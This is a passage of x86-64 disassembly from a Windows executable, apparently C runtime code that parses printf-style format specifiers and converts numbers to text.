   1400047f3:	75 05                	jne    0x1400047fa
   1400047f5:	41 01 11             	add    %edx,(%r9)
   1400047f8:	eb 37                	jmp    0x140004831
   1400047fa:	85 d2                	test   %edx,%edx
   1400047fc:	7e 33                	jle    0x140004831
   1400047fe:	8a 4d 00             	mov    0x0(%rbp),%cl
   140004801:	4c 8b c7             	mov    %rdi,%r8
   140004804:	48 8b d6             	mov    %rsi,%rdx
   140004807:	ff cb                	dec    %ebx
   140004809:	e8 1e ff ff ff       	call   0x14000472c
   14000480e:	48 ff c5             	inc    %rbp
   140004811:	83 3f ff             	cmpl   $0xffffffff,(%rdi)
   140004814:	75 17                	jne    0x14000482d
   140004816:	e8 89 e8 ff ff       	call   0x1400030a4
   14000481b:	83 38 2a             	cmpl   $0x2a,(%rax)
   14000481e:	75 11                	jne    0x140004831
   140004820:	4c 8b c7             	mov    %rdi,%r8
   140004823:	48 8b d6             	mov    %rsi,%rdx
   140004826:	b1 3f                	mov    $0x3f,%cl
   140004828:	e8 ff fe ff ff       	call   0x14000472c
   14000482d:	85 db                	test   %ebx,%ebx
   14000482f:	7f cd                	jg     0x1400047fe
   140004831:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004836:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000483b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004840:	48 83 c4 20          	add    $0x20,%rsp
   140004844:	5f                   	pop    %rdi
   140004845:	c3                   	ret
   140004846:	cc                   	int3
   140004847:	cc                   	int3
   140004848:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000484d:	55                   	push   %rbp
   14000484e:	56                   	push   %rsi
   14000484f:	57                   	push   %rdi
   140004850:	41 54                	push   %r12
   140004852:	41 55                	push   %r13
   140004854:	41 56                	push   %r14
   140004856:	41 57                	push   %r15
   140004858:	48 81 ec d0 02 00 00 	sub    $0x2d0,%rsp
   14000485f:	48 8b 05 e2 e7 00 00 	mov    0xe7e2(%rip),%rax        # 0x140013048
   140004866:	48 33 c4             	xor    %rsp,%rax
   140004869:	48 89 84 24 c8 02 00 	mov    %rax,0x2c8(%rsp)
   140004870:	00 
   140004871:	33 c0                	xor    %eax,%eax
   140004873:	48 8b d9             	mov    %rcx,%rbx
   140004876:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   14000487b:	48 8b fa             	mov    %rdx,%rdi
   14000487e:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140004883:	49 8b d0             	mov    %r8,%rdx
   140004886:	4d 8b e9             	mov    %r9,%r13
   140004889:	89 44 24 60          	mov    %eax,0x60(%rsp)
   14000488d:	44 8b e0             	mov    %eax,%r12d
   140004890:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140004894:	44 8b f8             	mov    %eax,%r15d
   140004897:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000489b:	89 44 24 58          	mov    %eax,0x58(%rsp)
   14000489f:	89 44 24 50          	mov    %eax,0x50(%rsp)
   1400048a3:	e8 d8 fd ff ff       	call   0x140004680
   1400048a8:	45 33 d2             	xor    %r10d,%r10d
   1400048ab:	49 3b da             	cmp    %r10,%rbx
   1400048ae:	75 41                	jne    0x1400048f1
   1400048b0:	e8 ef e7 ff ff       	call   0x1400030a4
   1400048b5:	33 db                	xor    %ebx,%ebx
   1400048b7:	45 33 c9             	xor    %r9d,%r9d
   1400048ba:	45 33 c0             	xor    %r8d,%r8d
   1400048bd:	33 d2                	xor    %edx,%edx
   1400048bf:	33 c9                	xor    %ecx,%ecx
   1400048c1:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400048c7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400048cc:	e8 03 e7 ff ff       	call   0x140002fd4
   1400048d1:	38 9c 24 90 00 00 00 	cmp    %bl,0x90(%rsp)
   1400048d8:	74 0f                	je     0x1400048e9
   1400048da:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1400048e1:	00 
   1400048e2:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1400048e9:	83 c8 ff             	or     $0xffffffff,%eax
   1400048ec:	e9 17 08 00 00       	jmp    0x140005108
   1400048f1:	41 83 ce ff          	or     $0xffffffff,%r14d
   1400048f5:	f6 43 18 40          	testb  $0x40,0x18(%rbx)
   1400048f9:	4c 8d 0d 00 b7 ff ff 	lea    -0x4900(%rip),%r9        # 0x140000000
   140004900:	0f 85 ba 00 00 00    	jne    0x1400049c0
   140004906:	48 8b cb             	mov    %rbx,%rcx
   140004909:	e8 06 35 00 00       	call   0x140007e14
   14000490e:	48 8d 15 fb ec 00 00 	lea    0xecfb(%rip),%rdx        # 0x140013610
   140004915:	41 3b c6             	cmp    %r14d,%eax
   140004918:	74 28                	je     0x140004942
   14000491a:	83 f8 fe             	cmp    $0xfffffffe,%eax
   14000491d:	74 23                	je     0x140004942
   14000491f:	4c 63 c0             	movslq %eax,%r8
   140004922:	4c 8d 0d d7 b6 ff ff 	lea    -0x4929(%rip),%r9        # 0x140000000
   140004929:	49 8b c8             	mov    %r8,%rcx
   14000492c:	41 83 e0 1f          	and    $0x1f,%r8d
   140004930:	48 c1 f9 05          	sar    $0x5,%rcx
   140004934:	4d 6b c0 58          	imul   $0x58,%r8,%r8
   140004938:	4d 03 84 c9 80 65 01 	add    0x16580(%r9,%rcx,8),%r8
   14000493f:	00 
   140004940:	eb 0a                	jmp    0x14000494c
   140004942:	4c 8b c2             	mov    %rdx,%r8
   140004945:	4c 8d 0d b4 b6 ff ff 	lea    -0x494c(%rip),%r9        # 0x140000000
   14000494c:	41 f6 40 38 7f       	testb  $0x7f,0x38(%r8)
   140004951:	75 29                	jne    0x14000497c
   140004953:	41 3b c6             	cmp    %r14d,%eax
   140004956:	74 1e                	je     0x140004976
   140004958:	83 f8 fe             	cmp    $0xfffffffe,%eax
   14000495b:	74 19                	je     0x140004976
   14000495d:	48 63 d0             	movslq %eax,%rdx
   140004960:	48 8b c2             	mov    %rdx,%rax
   140004963:	83 e2 1f             	and    $0x1f,%edx
   140004966:	48 c1 f8 05          	sar    $0x5,%rax
   14000496a:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   14000496e:	49 03 94 c1 80 65 01 	add    0x16580(%r9,%rax,8),%rdx
   140004975:	00 
   140004976:	f6 42 38 80          	testb  $0x80,0x38(%rdx)
   14000497a:	74 41                	je     0x1400049bd
   14000497c:	e8 23 e7 ff ff       	call   0x1400030a4
   140004981:	33 db                	xor    %ebx,%ebx
   140004983:	45 33 c9             	xor    %r9d,%r9d
   140004986:	45 33 c0             	xor    %r8d,%r8d
   140004989:	33 d2                	xor    %edx,%edx
   14000498b:	33 c9                	xor    %ecx,%ecx
   14000498d:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004993:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004998:	e8 37 e6 ff ff       	call   0x140002fd4
   14000499d:	38 9c 24 90 00 00 00 	cmp    %bl,0x90(%rsp)
   1400049a4:	74 0f                	je     0x1400049b5
   1400049a6:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1400049ad:	00 
   1400049ae:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   1400049b5:	41 8b c6             	mov    %r14d,%eax
   1400049b8:	e9 4b 07 00 00       	jmp    0x140005108
   1400049bd:	45 33 d2             	xor    %r10d,%r10d
   1400049c0:	49 3b fa             	cmp    %r10,%rdi
   1400049c3:	74 b7                	je     0x14000497c
   1400049c5:	40 8a 2f             	mov    (%rdi),%bpl
   1400049c8:	41 8b f2             	mov    %r10d,%esi
   1400049cb:	44 89 54 24 40       	mov    %r10d,0x40(%rsp)
   1400049d0:	44 89 54 24 44       	mov    %r10d,0x44(%rsp)
   1400049d5:	41 8b d2             	mov    %r10d,%edx
   1400049d8:	4c 89 94 24 98 00 00 	mov    %r10,0x98(%rsp)
   1400049df:	00 
   1400049e0:	41 3a ea             	cmp    %r10b,%bpl
   1400049e3:	0f 84 04 07 00 00    	je     0x1400050ed
   1400049e9:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   1400049f0:	00 
   1400049f1:	41 bb 00 02 00 00    	mov    $0x200,%r11d
   1400049f7:	48 ff c7             	inc    %rdi
   1400049fa:	41 3b f2             	cmp    %r10d,%esi
   1400049fd:	48 89 bc 24 b0 00 00 	mov    %rdi,0xb0(%rsp)
   140004a04:	00 
   140004a05:	0f 8c d4 06 00 00    	jl     0x1400050df
   140004a0b:	8d 45 e0             	lea    -0x20(%rbp),%eax
   140004a0e:	3c 58                	cmp    $0x58,%al
   140004a10:	77 12                	ja     0x140004a24
   140004a12:	48 0f be c5          	movsbq %bpl,%rax
   140004a16:	42 0f b6 8c 08 e0 ea 	movzbl 0xeae0(%rax,%r9,1),%ecx
   140004a1d:	00 00 
   140004a1f:	83 e1 0f             	and    $0xf,%ecx
   140004a22:	eb 03                	jmp    0x140004a27
   140004a24:	41 8b ca             	mov    %r10d,%ecx
   140004a27:	48 63 c1             	movslq %ecx,%rax
   140004a2a:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   140004a2e:	48 63 c2             	movslq %edx,%rax
   140004a31:	48 03 c8             	add    %rax,%rcx
   140004a34:	42 0f b6 94 09 00 eb 	movzbl 0xeb00(%rcx,%r9,1),%edx
   140004a3b:	00 00 
   140004a3d:	c1 ea 04             	shr    $0x4,%edx
   140004a40:	89 54 24 5c          	mov    %edx,0x5c(%rsp)
   140004a44:	83 fa 08             	cmp    $0x8,%edx
   140004a47:	0f 84 2f ff ff ff    	je     0x14000497c
   140004a4d:	8b ca                	mov    %edx,%ecx
   140004a4f:	41 3b d2             	cmp    %r10d,%edx
   140004a52:	0f 84 8a 07 00 00    	je     0x1400051e2
   140004a58:	83 e9 01             	sub    $0x1,%ecx
   140004a5b:	0f 84 99 08 00 00    	je     0x1400052fa
   140004a61:	83 e9 01             	sub    $0x1,%ecx
   140004a64:	0f 84 40 08 00 00    	je     0x1400052aa
   140004a6a:	83 e9 01             	sub    $0x1,%ecx
   140004a6d:	0f 84 fc 07 00 00    	je     0x14000526f
   140004a73:	83 e9 01             	sub    $0x1,%ecx
   140004a76:	0f 84 eb 07 00 00    	je     0x140005267
   140004a7c:	83 e9 01             	sub    $0x1,%ecx
   140004a7f:	0f 84 b1 07 00 00    	je     0x140005236
   140004a85:	83 e9 01             	sub    $0x1,%ecx
   140004a88:	0f 84 a5 06 00 00    	je     0x140005133
   140004a8e:	83 f9 01             	cmp    $0x1,%ecx
   140004a91:	0f 85 3c 06 00 00    	jne    0x1400050d3
   140004a97:	40 0f be c5          	movsbl %bpl,%eax
   140004a9b:	83 f8 64             	cmp    $0x64,%eax
   140004a9e:	0f 8f 7e 01 00 00    	jg     0x140004c22
   140004aa4:	0f 84 80 02 00 00    	je     0x140004d2a
   140004aaa:	83 f8 41             	cmp    $0x41,%eax
   140004aad:	0f 84 40 01 00 00    	je     0x140004bf3
   140004ab3:	83 f8 43             	cmp    $0x43,%eax
   140004ab6:	0f 84 d0 00 00 00    	je     0x140004b8c
   140004abc:	83 f8 45             	cmp    $0x45,%eax
   140004abf:	0f 84 2e 01 00 00    	je     0x140004bf3
   140004ac5:	83 f8 47             	cmp    $0x47,%eax
   140004ac8:	0f 84 25 01 00 00    	je     0x140004bf3
   140004ace:	83 f8 53             	cmp    $0x53,%eax
   140004ad1:	74 6d                	je     0x140004b40
   140004ad3:	83 f8 58             	cmp    $0x58,%eax
   140004ad6:	0f 84 e4 01 00 00    	je     0x140004cc0
   140004adc:	83 f8 5a             	cmp    $0x5a,%eax
   140004adf:	74 17                	je     0x140004af8
   140004ae1:	83 f8 61             	cmp    $0x61,%eax
   140004ae4:	0f 84 15 01 00 00    	je     0x140004bff
   140004aea:	83 f8 63             	cmp    $0x63,%eax
   140004aed:	0f 84 a7 00 00 00    	je     0x140004b9a
   140004af3:	e9 48 04 00 00       	jmp    0x140004f40
   140004af8:	49 8b 45 00          	mov    0x0(%r13),%rax
   140004afc:	49 83 c5 08          	add    $0x8,%r13
   140004b00:	49 3b c2             	cmp    %r10,%rax
   140004b03:	74 2f                	je     0x140004b34
   140004b05:	48 8b 58 08          	mov    0x8(%rax),%rbx
   140004b09:	49 3b da             	cmp    %r10,%rbx
   140004b0c:	74 26                	je     0x140004b34
   140004b0e:	41 0f ba e4 0b       	bt     $0xb,%r12d
   140004b13:	0f bf 00             	movswl (%rax),%eax
   140004b16:	73 12                	jae    0x140004b2a
   140004b18:	99                   	cltd
   140004b19:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140004b20:	00 
   140004b21:	2b c2                	sub    %edx,%eax
   140004b23:	d1 f8                	sar    $1,%eax
   140004b25:	e9 12 04 00 00       	jmp    0x140004f3c
   140004b2a:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   140004b2f:	e9 08 04 00 00       	jmp    0x140004f3c
   140004b34:	48 8b 1d c5 ea 00 00 	mov    0xeac5(%rip),%rbx        # 0x140013600
   140004b3b:	e9 f1 03 00 00       	jmp    0x140004f31
   140004b40:	41 f7 c4 30 08 00 00 	test   $0x830,%r12d
   140004b47:	75 05                	jne    0x140004b4e
   140004b49:	41 0f ba ec 0b       	bts    $0xb,%r12d
   140004b4e:	49 8b 5d 00          	mov    0x0(%r13),%rbx
   140004b52:	45 3b fe             	cmp    %r14d,%r15d
   140004b55:	41 8b c7             	mov    %r15d,%eax
   140004b58:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
   140004b5d:	0f 44 c1             	cmove  %ecx,%eax
   140004b60:	49 83 c5 08          	add    $0x8,%r13
   140004b64:	41 f7 c4 10 08 00 00 	test   $0x810,%r12d
   140004b6b:	0f 84 1a 01 00 00    	je     0x140004c8b
   140004b71:	49 3b da             	cmp    %r10,%rbx
   140004b74:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140004b7b:	00 
   140004b7c:	48 0f 44 1d 84 ea 00 	cmove  0xea84(%rip),%rbx        # 0x140013608
   140004b83:	00 
   140004b84:	48 8b cb             	mov    %rbx,%rcx
   140004b87:	e9 f2 00 00 00       	jmp    0x140004c7e
   140004b8c:	41 f7 c4 30 08 00 00 	test   $0x830,%r12d
   140004b93:	75 05                	jne    0x140004b9a
   140004b95:	41 0f ba ec 0b       	bts    $0xb,%r12d
   140004b9a:	49 83 c5 08          	add    $0x8,%r13
   140004b9e:	41 f7 c4 10 08 00 00 	test   $0x810,%r12d
   140004ba5:	74 2c                	je     0x140004bd3
   140004ba7:	45 0f b7 4d f8       	movzwl -0x8(%r13),%r9d
   140004bac:	48 8d 94 24 c0 00 00 	lea    0xc0(%rsp),%rdx
   140004bb3:	00 
   140004bb4:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   140004bb9:	4d 8b c3             	mov    %r11,%r8
   140004bbc:	e8 43 35 00 00       	call   0x140008104
   140004bc1:	45 33 d2             	xor    %r10d,%r10d
   140004bc4:	41 3b c2             	cmp    %r10d,%eax
   140004bc7:	74 1d                	je     0x140004be6
   140004bc9:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
   140004bd0:	00 
   140004bd1:	eb 13                	jmp    0x140004be6
   140004bd3:	41 8a 45 f8          	mov    -0x8(%r13),%al
   140004bd7:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
   140004bde:	00 
   140004bdf:	88 84 24 c0 00 00 00 	mov    %al,0xc0(%rsp)
   140004be6:	48 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%rbx
   140004bed:	00 
   140004bee:	e9 4d 03 00 00       	jmp    0x140004f40
   140004bf3:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140004bfa:	00 
   140004bfb:	40 80 c5 20          	add    $0x20,%bpl
   140004bff:	41 83 cc 40          	or     $0x40,%r12d
   140004c03:	45 3b fa             	cmp    %r10d,%r15d
   140004c06:	48 8d 9c 24 c0 00 00 	lea    0xc0(%rsp),%rbx
   140004c0d:	00 
   140004c0e:	41 8b f3             	mov    %r11d,%esi
   140004c11:	0f 8d 2d 02 00 00    	jge    0x140004e44
   140004c17:	41 bf 06 00 00 00    	mov    $0x6,%r15d
   140004c1d:	e9 6b 02 00 00       	jmp    0x140004e8d
   140004c22:	83 f8 65             	cmp    $0x65,%eax
   140004c25:	0f 8c 15 03 00 00    	jl     0x140004f40
   140004c2b:	83 f8 67             	cmp    $0x67,%eax
   140004c2e:	7e cf                	jle    0x140004bff
   140004c30:	83 f8 69             	cmp    $0x69,%eax
   140004c33:	0f 84 f1 00 00 00    	je     0x140004d2a
   140004c39:	83 f8 6e             	cmp    $0x6e,%eax
   140004c3c:	0f 84 b5 00 00 00    	je     0x140004cf7
   140004c42:	83 f8 6f             	cmp    $0x6f,%eax
   140004c45:	0f 84 9a 00 00 00    	je     0x140004ce5
   140004c4b:	83 f8 70             	cmp    $0x70,%eax
   140004c4e:	74 65                	je     0x140004cb5
   140004c50:	83 f8 73             	cmp    $0x73,%eax
   140004c53:	0f 84 f5 fe ff ff    	je     0x140004b4e
   140004c59:	83 f8 75             	cmp    $0x75,%eax
   140004c5c:	0f 84 cc 00 00 00    	je     0x140004d2e
   140004c62:	83 f8 78             	cmp    $0x78,%eax
   140004c65:	0f 85 d5 02 00 00    	jne    0x140004f40
   140004c6b:	b8 27 00 00 00       	mov    $0x27,%eax
   140004c70:	eb 53                	jmp    0x140004cc5
   140004c72:	ff c8                	dec    %eax
   140004c74:	66 44 39 11          	cmp    %r10w,(%rcx)
   140004c78:	74 09                	je     0x140004c83
   140004c7a:	48 83 c1 02          	add    $0x2,%rcx
   140004c7e:	41 3b c2             	cmp    %r10d,%eax
   140004c81:	75 ef                	jne    0x140004c72
   140004c83:	48 2b cb             	sub    %rbx,%rcx
   140004c86:	48 d1 f9             	sar    $1,%rcx
   140004c89:	eb 21                	jmp    0x140004cac
   140004c8b:	49 3b da             	cmp    %r10,%rbx
   140004c8e:	48 0f 44 1d 6a e9 00 	cmove  0xe96a(%rip),%rbx        # 0x140013600
   140004c95:	00 
   140004c96:	48 8b cb             	mov    %rbx,%rcx
   140004c99:	eb 0a                	jmp    0x140004ca5
   140004c9b:	ff c8                	dec    %eax
   140004c9d:	44 38 11             	cmp    %r10b,(%rcx)
   140004ca0:	74 08                	je     0x140004caa
   140004ca2:	48 ff c1             	inc    %rcx
   140004ca5:	41 3b c2             	cmp    %r10d,%eax
   140004ca8:	75 f1                	jne    0x140004c9b
   140004caa:	2b cb                	sub    %ebx,%ecx
   140004cac:	89 4c 24 44          	mov    %ecx,0x44(%rsp)
   140004cb0:	e9 8b 02 00 00       	jmp    0x140004f40
   140004cb5:	41 bf 10 00 00 00    	mov    $0x10,%r15d
   140004cbb:	41 0f ba ec 0f       	bts    $0xf,%r12d
   140004cc0:	b8 07 00 00 00       	mov    $0x7,%eax
   140004cc5:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140004cc9:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140004ccf:	45 84 e4             	test   %r12b,%r12b
   140004cd2:	79 60                	jns    0x140004d34
   140004cd4:	04 51                	add    $0x51,%al
   140004cd6:	c6 44 24 4c 30       	movb   $0x30,0x4c(%rsp)
   140004cdb:	41 8d 51 f2          	lea    -0xe(%r9),%edx
   140004cdf:	88 44 24 4d          	mov    %al,0x4d(%rsp)
   140004ce3:	eb 53                	jmp    0x140004d38
   140004ce5:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140004ceb:	45 84 e4             	test   %r12b,%r12b
   140004cee:	79 44                	jns    0x140004d34
   140004cf0:	41 0f ba ec 09       	bts    $0x9,%r12d
   140004cf5:	eb 3d                	jmp    0x140004d34
   140004cf7:	49 8b 7d 00          	mov    0x0(%r13),%rdi
   140004cfb:	49 83 c5 08          	add    $0x8,%r13
   140004cff:	e8 d8 31 00 00       	call   0x140007edc
   140004d04:	45 33 d2             	xor    %r10d,%r10d
   140004d07:	41 3b c2             	cmp    %r10d,%eax
   140004d0a:	0f 84 6c fc ff ff    	je     0x14000497c
   140004d10:	41 f6 c4 20          	test   $0x20,%r12b
   140004d14:	74 05                	je     0x140004d1b
   140004d16:	66 89 37             	mov    %si,(%rdi)
   140004d19:	eb 02                	jmp    0x140004d1d
   140004d1b:	89 37                	mov    %esi,(%rdi)
   140004d1d:	c7 44 24 58 01 00 00 	movl   $0x1,0x58(%rsp)
   140004d24:	00 
   140004d25:	e9 6c 03 00 00       	jmp    0x140005096
   140004d2a:	41 83 cc 40          	or     $0x40,%r12d
   140004d2e:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   140004d34:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140004d38:	41 0f ba e4 0f       	bt     $0xf,%r12d
   140004d3d:	72 07                	jb     0x140004d46
   140004d3f:	41 0f ba e4 0c       	bt     $0xc,%r12d
   140004d44:	73 0a                	jae    0x140004d50
   140004d46:	4d 8b 45 00          	mov    0x0(%r13),%r8
   140004d4a:	49 83 c5 08          	add    $0x8,%r13
   140004d4e:	eb 2e                	jmp    0x140004d7e
   140004d50:	49 83 c5 08          	add    $0x8,%r13
   140004d54:	41 f6 c4 20          	test   $0x20,%r12b
   140004d58:	74 14                	je     0x140004d6e
   140004d5a:	41 f6 c4 40          	test   $0x40,%r12b
   140004d5e:	74 07                	je     0x140004d67
   140004d60:	4d 0f bf 45 f8       	movswq -0x8(%r13),%r8
   140004d65:	eb 17                	jmp    0x140004d7e
   140004d67:	45 0f b7 45 f8       	movzwl -0x8(%r13),%r8d
   140004d6c:	eb 10                	jmp    0x140004d7e
   140004d6e:	41 f6 c4 40          	test   $0x40,%r12b
   140004d72:	74 06                	je     0x140004d7a
   140004d74:	4d 63 45 f8          	movslq -0x8(%r13),%r8
   140004d78:	eb 04                	jmp    0x140004d7e
   140004d7a:	45 8b 45 f8          	mov    -0x8(%r13),%r8d
   140004d7e:	41 f6 c4 40          	test   $0x40,%r12b
   140004d82:	74 0d                	je     0x140004d91
   140004d84:	4d 3b c2             	cmp    %r10,%r8
   140004d87:	7d 08                	jge    0x140004d91
   140004d89:	49 f7 d8             	neg    %r8
   140004d8c:	41 0f ba ec 08       	bts    $0x8,%r12d
   140004d91:	41 0f ba e4 0f       	bt     $0xf,%r12d
   140004d96:	72 0a                	jb     0x140004da2
   140004d98:	41 0f ba e4 0c       	bt     $0xc,%r12d
   140004d9d:	72 03                	jb     0x140004da2
   140004d9f:	45 8b c0             	mov    %r8d,%r8d
   140004da2:	45 3b fa             	cmp    %r10d,%r15d
   140004da5:	7d 08                	jge    0x140004daf
   140004da7:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140004dad:	eb 0b                	jmp    0x140004dba
   140004daf:	41 83 e4 f7          	and    $0xfffffff7,%r12d
   140004db3:	45 3b fb             	cmp    %r11d,%r15d
   140004db6:	45 0f 4f fb          	cmovg  %r11d,%r15d
   140004dba:	44 8b 74 24 60       	mov    0x60(%rsp),%r14d
   140004dbf:	49 8b c0             	mov    %r8,%rax
   140004dc2:	48 8d 9c 24 bf 02 00 	lea    0x2bf(%rsp),%rbx
   140004dc9:	00 
   140004dca:	48 f7 d8             	neg    %rax
   140004dcd:	1b c9                	sbb    %ecx,%ecx
   140004dcf:	23 ca                	and    %edx,%ecx
   140004dd1:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   140004dd5:	41 8b cf             	mov    %r15d,%ecx
   140004dd8:	41 ff cf             	dec    %r15d
   140004ddb:	41 3b ca             	cmp    %r10d,%ecx
   140004dde:	7f 05                	jg     0x140004de5
   140004de0:	4d 3b c2             	cmp    %r10,%r8
   140004de3:	74 20                	je     0x140004e05
   140004de5:	33 d2                	xor    %edx,%edx
   140004de7:	49 8b c0             	mov    %r8,%rax
   140004dea:	49 63 c9             	movslq %r9d,%rcx
   140004ded:	48 f7 f1             	div    %rcx
   140004df0:	4c 8b c0             	mov    %rax,%r8
   140004df3:	8d 42 30             	lea    0x30(%rdx),%eax
   140004df6:	83 f8 39             	cmp    $0x39,%eax
   140004df9:	7e 03                	jle    0x140004dfe
   140004dfb:	41 03 c6             	add    %r14d,%eax
   140004dfe:	88 03                	mov    %al,(%rbx)
   140004e00:	48 ff cb             	dec    %rbx
   140004e03:	eb d0                	jmp    0x140004dd5
   140004e05:	48 8d 84 24 bf 02 00 	lea    0x2bf(%rsp),%rax
   140004e0c:	00 
   140004e0d:	41 be ff ff ff ff    	mov    $0xffffffff,%r14d
   140004e13:	2b c3                	sub    %ebx,%eax
   140004e15:	48 ff c3             	inc    %rbx
   140004e18:	41 0f ba e4 09       	bt     $0x9,%r12d
   140004e1d:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140004e21:	0f 83 19 01 00 00    	jae    0x140004f40
   140004e27:	41 3b c2             	cmp    %r10d,%eax
   140004e2a:	74 09                	je     0x140004e35
   140004e2c:	80 3b 30             	cmpb   $0x30,(%rbx)
   140004e2f:	0f 84 0b 01 00 00    	je     0x140004f40
   140004e35:	48 ff cb             	dec    %rbx
   140004e38:	ff 44 24 44          	incl   0x44(%rsp)
   140004e3c:	c6 03 30             	movb   $0x30,(%rbx)
   140004e3f:	e9 fc 00 00 00       	jmp    0x140004f40
   140004e44:	75 0e                	jne    0x140004e54
   140004e46:	40 80 fd 67          	cmp    $0x67,%bpl
   140004e4a:	75 41                	jne    0x140004e8d
   140004e4c:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140004e52:	eb 39                	jmp    0x140004e8d
   140004e54:	45 3b fb             	cmp    %r11d,%r15d
   140004e57:	45 0f 4f fb          	cmovg  %r11d,%r15d
   140004e5b:	41 81 ff a3 00 00 00 	cmp    $0xa3,%r15d
   140004e62:	7e 29                	jle    0x140004e8d
   140004e64:	41 8d bf 5d 01 00 00 	lea    0x15d(%r15),%edi
   140004e6b:	48 63 cf             	movslq %edi,%rcx
   140004e6e:	e8 d1 0f 00 00       	call   0x140005e44
   140004e73:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
   140004e7a:	00 
   140004e7b:	48 85 c0             	test   %rax,%rax
   140004e7e:	74 07                	je     0x140004e87
   140004e80:	48 8b d8             	mov    %rax,%rbx
   140004e83:	8b f7                	mov    %edi,%esi
   140004e85:	eb 06                	jmp    0x140004e8d
   140004e87:	41 bf a3 00 00 00    	mov    $0xa3,%r15d
   140004e8d:	49 8b 45 00          	mov    0x0(%r13),%rax
   140004e91:	48 8b 0d 38 e7 00 00 	mov    0xe738(%rip),%rcx        # 0x1400135d0
   140004e98:	49 83 c5 08          	add    $0x8,%r13
   140004e9c:	40 0f be fd          	movsbl %bpl,%edi
   140004ea0:	48 63 f6             	movslq %esi,%rsi
   140004ea3:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
   140004eaa:	00 
   140004eab:	e8 f8 e5 ff ff       	call   0x1400034a8
   140004eb0:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140004eb5:	44 8b cf             	mov    %edi,%r9d
   140004eb8:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140004ebd:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   140004ec1:	4c 8b c6             	mov    %rsi,%r8
   140004ec4:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140004ec8:	48 8d 8c 24 a8 00 00 	lea    0xa8(%rsp),%rcx
   140004ecf:	00 
   140004ed0:	48 8b d3             	mov    %rbx,%rdx
   140004ed3:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140004ed8:	ff d0                	call   *%rax
   140004eda:	41 8b fc             	mov    %r12d,%edi
   140004edd:	33 c0                	xor    %eax,%eax
   140004edf:	81 e7 80 00 00 00    	and    $0x80,%edi
   140004ee5:	74 1d                	je     0x140004f04
   140004ee7:	44 3b f8             	cmp    %eax,%r15d
   140004eea:	75 18                	jne    0x140004f04
   140004eec:	48 8b 0d f5 e6 00 00 	mov    0xe6f5(%rip),%rcx        # 0x1400135e8
   140004ef3:	e8 b0 e5 ff ff       	call   0x1400034a8
   140004ef8:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   140004efd:	48 8b cb             	mov    %rbx,%rcx
   140004f00:	ff d0                	call   *%rax
   140004f02:	33 c0                	xor    %eax,%eax
   140004f04:	40 80 fd 67          	cmp    $0x67,%bpl
   140004f08:	75 1a                	jne    0x140004f24
   140004f0a:	3b f8                	cmp    %eax,%edi
   140004f0c:	75 16                	jne    0x140004f24
   140004f0e:	48 8b 0d cb e6 00 00 	mov    0xe6cb(%rip),%rcx        # 0x1400135e0
   140004f15:	e8 8e e5 ff ff       	call   0x1400034a8
   140004f1a:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   140004f1f:	48 8b cb             	mov    %rbx,%rcx
   140004f22:	ff d0                	call   *%rax
   140004f24:	80 3b 2d             	cmpb   $0x2d,(%rbx)
   140004f27:	75 08                	jne    0x140004f31
   140004f29:	41 0f ba ec 08       	bts    $0x8,%r12d
   140004f2e:	48 ff c3             	inc    %rbx
   140004f31:	48 8b cb             	mov    %rbx,%rcx
   140004f34:	e8 37 da ff ff       	call   0x140002970
   140004f39:	45 33 d2             	xor    %r10d,%r10d
   140004f3c:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140004f40:	44 39 54 24 58       	cmp    %r10d,0x58(%rsp)
   140004f45:	0f 85 4b 01 00 00    	jne    0x140005096
   140004f4b:	41 f6 c4 40          	test   $0x40,%r12b
   140004f4f:	74 31                	je     0x140004f82
   140004f51:	41 0f ba e4 08       	bt     $0x8,%r12d
   140004f56:	73 07                	jae    0x140004f5f
   140004f58:	c6 44 24 4c 2d       	movb   $0x2d,0x4c(%rsp)
